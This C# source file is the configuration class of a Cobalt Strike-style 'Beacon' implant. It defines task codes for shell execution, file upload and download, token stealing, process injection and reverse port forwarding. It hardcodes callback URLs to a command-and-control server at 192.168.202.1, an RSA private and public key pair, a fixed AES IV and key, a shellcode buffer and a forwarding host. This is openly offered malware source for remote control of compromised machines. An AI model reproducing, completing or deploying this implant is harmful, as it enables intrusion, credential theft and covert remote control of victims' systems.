using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using Beacon.Crypt;
using Beacon.Crypt.Internal;

namespace Beacon.Profiles
{
    public class Config
    {
        //_pBeaconID
        public static int _nBeaconID;

        public enum FUNCINDEX 
        {
            	SLEEP        = 4,
                EXECUTE      = 12,
	            SHELL        = 78,
	            UPLOAD_START = 10,
	            UPLOAD_LOOP  = 67,
	            DOWNLOAD     = 11,
                LS           = 53,
                MKDIR        = 54,
                RM           = 56,
	            EXIT         = 3,
	            CD           = 5,
	            PWD          = 39,
	            FILE_BROWSE  = 53,
                Kill         = 33,
                RUNAS        = 38,
                RUN          = 78,
                SETENV       = 72,
                COPYFILE     = 73,
                MOVEFILE     = 74,
                PS           = 32,
                DRIVES       = 55,
                MAKE_TOKEN   = 49,
                STEAL_TOKEN  = 31,
                REV2SELF     = 28,
                INJECT_X86   = 9,
                INJECT_X64   = 43,
                GETUID       = 27,
                RPORTFWD     = 50,
                RPORTFWD_STOP= 51,
                RUNU         = 76,
                GETPRIVS     = 77,
        };

        //RSA
        //Public Key: MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCo+JzT9RUlSOptM8oK5Vd2gEAmewCSulteSjwUJS/3MY+Y0JMzAcLgXS0uOgYQATcWTJjoOY8d8Y4I05xP3N0xpi2P4ik0tN73vgh3IY0r7IkReT9RVCwaISIqJcI9Ty2R39lYG5fOKhwohQLApFBIWtGkXAfgNE1pcGjZlqQ8RQIDAQAB
        //Private Key: MIICdQIBADANBgkqhkiG9w0BAQEFAASCAl8wggJbAgEAAoGBAKj4nNP1FSVI6m0zygrlV3aAQCZ7AJK6W15KPBQlL/cxj5jQkzMBwuBdLS46BhABNxZMmOg5jx3xjgjTnE/c3TGmLY/iKTS03ve+CHchjSvsiRF5P1FULBohIiolwj1PLZHf2Vgbl84qHCiFAsCkUEha0aRcB+A0TWlwaNmWpDxFAgMBAAECgYAzRr7Q058HIYmCeiTmCZLxMxpEky8pV8RCaOSyeFaF/VRGW4VQBUjOLXh4fsM4OCYvbi84yb7Up2ki5JSa57t3x2rtdPv38ggYpI/GoBSnsWhFjMoosuQHypr4CK5RkJVNJ6zt4Uj18JrAkDdvIS38Z7e0tpAqQDmzBKDA7xRAAQJBANAW+x6rZoxdEfqRPo0dVudfpqZxS33810rPpaVl/AJ1CEeC0caquySD4XjoWeLaClg1CrU0qvMjsb1UWIslIUUCQQDP3/DTbzjeKGBZSpdR+YPL6D8YoG+8EhWLhpb9f4wTK+aE2TvMs+6mpDUxsIy/Bw76u4oFgDLHMA91CiKDtN8BAkBEqABsyxKHp0GCUZ+4wYBl0IpUijblN6H0/fPiUXbHfMOhjIkYKkaasqSW1tqpXVViawXAacMpe5JuLEEWj8adAkAQdxV1Od8QQbR3/h+EP7Y/xXKR+cs/41LPjWaSR7MJpbWJmkdRTIM/scwA1pIfY2i9VXN2QhRDkLv4skfPlNkBAkAFuOhH80F4FsYQJgkFHSO0V4q3WYoclwiMFehfmBnSEDGhzdVTLn1EjjGiGeigSI/yFLJrkqoh0nF7eG/8VilV
        public static RsaKey _key = new RsaKey
        {
            Private = @"-----BEGIN PRIVATE KEY-----
MIICdQIBADANBgkqhkiG9w0BAQEFAASCAl8wggJbAgEAAoGBAKj4nNP1FSVI6m0z
ygrlV3aAQCZ7AJK6W15KPBQlL/cxj5jQkzMBwuBdLS46BhABNxZMmOg5jx3xjgjT
nE/c3TGmLY/iKTS03ve+CHchjSvsiRF5P1FULBohIiolwj1PLZHf2Vgbl84qHCiF
AsCkUEha0aRcB+A0TWlwaNmWpDxFAgMBAAECgYAzRr7Q058HIYmCeiTmCZLxMxpE
ky8pV8RCaOSyeFaF/VRGW4VQBUjOLXh4fsM4OCYvbi84yb7Up2ki5JSa57t3x2rt
dPv38ggYpI/GoBSnsWhFjMoosuQHypr4CK5RkJVNJ6zt4Uj18JrAkDdvIS38Z7e0
tpAqQDmzBKDA7xRAAQJBANAW+x6rZoxdEfqRPo0dVudfpqZxS33810rPpaVl/AJ1
CEeC0caquySD4XjoWeLaClg1CrU0qvMjsb1UWIslIUUCQQDP3/DTbzjeKGBZSpdR
+YPL6D8YoG+8EhWLhpb9f4wTK+aE2TvMs+6mpDUxsIy/Bw76u4oFgDLHMA91CiKD
tN8BAkBEqABsyxKHp0GCUZ+4wYBl0IpUijblN6H0/fPiUXbHfMOhjIkYKkaasqSW
1tqpXVViawXAacMpe5JuLEEWj8adAkAQdxV1Od8QQbR3/h+EP7Y/xXKR+cs/41LP
jWaSR7MJpbWJmkdRTIM/scwA1pIfY2i9VXN2QhRDkLv4skfPlNkBAkAFuOhH80F4
FsYQJgkFHSO0V4q3WYoclwiMFehfmBnSEDGhzdVTLn1EjjGiGeigSI/yFLJrkqoh
0nF7eG/8VilV
-----END PRIVATE KEY-----
",
            Public = @"-----BEGIN PUBLIC KEY-----
MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCo+JzT9RUlSOptM8oK5Vd2gEAm
ewCSulteSjwUJS/3MY+Y0JMzAcLgXS0uOgYQATcWTJjoOY8d8Y4I05xP3N0xpi2P
4ik0tN73vgh3IY0r7IkReT9RVCwaISIqJcI9Ty2R39lYG5fOKhwohQLApFBIWtGk
XAfgNE1pcGjZlqQ8RQIDAQAB
-----END PUBLIC KEY-----
"
        };

        //IV
        public static string _IV = "abcdefghijklmnop";

        //HmacKey
        public static byte[] _HmacKey;

        //AesKey
        public static byte[] _AesKey;

        //GlobalKey
        public static byte[] GlobalKey = new byte[16] { 1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1};

        //User-agent


        //maxAttempts
        public static int _maxAttempts = 10;

        //retryInterval
        public static int _retryInterval = 100000;

        //GETURL
        public static string _GETURL = "http://192.168.202.1/load";

        //PostUrl
        public static string _POSTURL = "http://192.168.202.1/submit.php?id=";

        //sleepTime
        public static int _nSleepTime = 5000;

        //ProcWaitTime
        public static int _nProcWaitTime = 10000;

        //CallbackCount
        public static int _nCount = 0;

        //MagicHeader
        public static int _nMagicHeader = 48879;

        //KilDate

        //Logon
        public static string _sLogonUser = "";
        public static string _sLogonPass = "";
        public static string _sLogonDomain = "";

        //Token
        public static IntPtr _TokenPtr = new IntPtr();

        //cs shellcode
       public static byte[] _pShellcodeBuf_X64 = { };
        //public static byte[] _pShellcodeBuf_X86 = { };

        //转发的端口和地址
        public static string _sForwardHost = "192.168.202.180";
        public static int _nForwardPort = 22222;
    }
}
